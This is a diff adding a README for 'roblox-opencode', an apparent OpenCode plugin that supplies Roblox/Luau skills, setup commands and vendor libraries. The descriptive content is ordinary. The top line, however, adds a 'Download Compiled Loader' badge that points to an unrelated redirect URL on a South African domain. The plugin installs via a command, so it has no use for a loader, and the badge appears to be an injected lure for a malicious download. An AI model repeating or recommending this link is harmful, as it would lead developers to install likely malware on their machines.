@@ -1,0 +1,71 @@
+# roblox-opencode
+
+[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+
+OpenCode plugin for Roblox/Luau development. Makes AI coding assistants competent at building Roblox games.
+
+## Install
+
+```
+opencode plugin roblox-opencode
+```
+
+Then run `opencode` once to activate (copies commands globally), then `/setup-game` in your project to configure.
+
+## What's included
+
+**15 skills** (loaded on-demand by the AI):
+- roblox-luau-mastery — Luau syntax, idioms, type system
+- roblox-gui — UI layout, mobile-first design, reactive frameworks
+- roblox-animation-vfx — Animation, particles, effects
+- roblox-networking — Security hardening, validation, rate limiting
+- roblox-data — ProfileStore, DataStores, persistence patterns
+- roblox-testing — TestEZ, BDD patterns, test strategy
+- roblox-tooling — Studio MCP, luau-lsp, diagnostics
+- roblox-architecture — Service hierarchy, 7 foundational patterns
+- roblox-runtime — RunService, StreamingEnabled, memory management
+- roblox-sharp-edges — 12 production footguns by severity
+- roblox-monetization — GamePasses, DevProducts, TOS compliance
+- roblox-sync — Script Sync setup and troubleshooting
+- roblox-code-review — Review with security/performance/monetization lenses
+- roblox-debug — Iterative debug loop for Luau/Roblox issues
+- roblox-publish-checklist — Pre-ship verification gauntlet
+
+**3 commands** (type `/` to use):
+- `/setup-game` — One-time project config (skills, vendor, LSP, sync)
+- `/init` — Bootstrap a new project or scan an existing one
+- `/diagnose` — Sync sanity check
+
+**Vendor libraries** (auto-placed with mention):
+- ProfileStore — Data persistence with session locking
+- Trove — Cleanup/lifecycle management
+- Signal — Typed custom signals (Sleitnick/RbxUtil)
+- Promise — Async flow control (evaera)
+- Comm — Typed client-server remotes (Sleitnick/RbxUtil)
+- Component — CollectionService tag binding (Sleitnick/RbxUtil)
+- t — Runtime type checking (osyrisrblx, recommended)
+- TestEZ — BDD testing framework (Roblox, recommended)
+- 25+ additional RbxUtil packages available on demand (see .opencode/vendor/README.md)
+
+## How it works
+
+The plugin registers a `roblox_setup` tool and copies 3 commands to your global config on first launch. When you run `/setup-game`, it copies 15 skills and vendor libs to `.opencode/`, writes LSP config to `opencode.json`, generates `.luaurc` with vendor path aliases, and writes the core directives block to `AGENTS.md`.
+
+After setup, the plugin is dormant. The 15 skills do all the work — the AI loads them on-demand based on what you're working on.
+
+## Prerequisites
+
+- [luau-lsp](https://github.com/JohnnyMorganz/luau-lsp) — Luau diagnostics (setup checks and guides install)
+- [Roblox Studio](https://www.roblox.com/create) — With Script Sync and MCP server enabled
+
+## Update
+
+```
+opencode plugin roblox-opencode --force
+```
+
+Re-runs setup. Skills, vendor libs, and config are overwritten. Content outside managed markers in AGENTS.md is preserved.
+
+## License
+
+MIT
